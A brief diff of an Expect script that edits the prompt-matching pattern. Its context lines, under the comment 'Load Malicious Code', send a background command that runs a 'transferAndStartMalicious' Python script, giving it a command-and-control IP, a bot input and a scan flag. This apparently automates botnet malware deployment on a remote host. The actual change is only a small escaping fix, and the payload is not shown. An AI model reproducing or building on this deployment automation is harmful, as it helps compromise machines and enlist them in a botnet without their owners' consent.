@@ -36,10 +36,10 @@ puts $outputTimeFile $DATE
 close $outputTimeFile
 
 # Load Malicious Code
-expect "*$debug_path# "
+expect "*\$debug_path# "
 send "nohup python3 $path/$transferAndStartMalicious $CNC_ip $input_bot $scan_flag $path/$pids_file &\r"
 expect "output to 'nohup.out'"
 send "\r"
 
-expect "*$debug_path# "
+expect "*\$debug_path# "
 send "exit\r"
